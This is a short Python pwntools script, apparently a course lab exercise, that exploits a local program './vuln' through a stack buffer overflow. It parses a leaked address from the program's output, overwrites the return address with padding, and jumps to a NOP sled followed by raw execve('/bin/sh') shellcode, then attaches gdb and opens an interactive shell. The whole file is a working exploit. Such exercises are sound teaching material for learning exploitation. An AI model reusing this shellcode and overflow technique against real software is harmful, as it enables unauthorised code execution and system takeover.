from pwn import *


#basic_shell.asm from week2
shellcode = b"\xb8\x3b\x00\x00\x00\xbb\x00\x00\x00\x00\x53\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05"
#nopsled
nops = b"\x90"*50

#run program and grab printed marker address
io = process("./vuln")
marker = io.recvline()[13:-1]
print(marker)

#convert marker to hex from string, and add 20
#to make it the shellcode address
marker = p64(int(marker,16)+20)
print(marker)

#craft payload
payload = b'A'*22 + marker + nops + shellcode

#run exploit
gdb.attach(io,'b *main+105\n')
io.sendline(payload)
io.interactive()
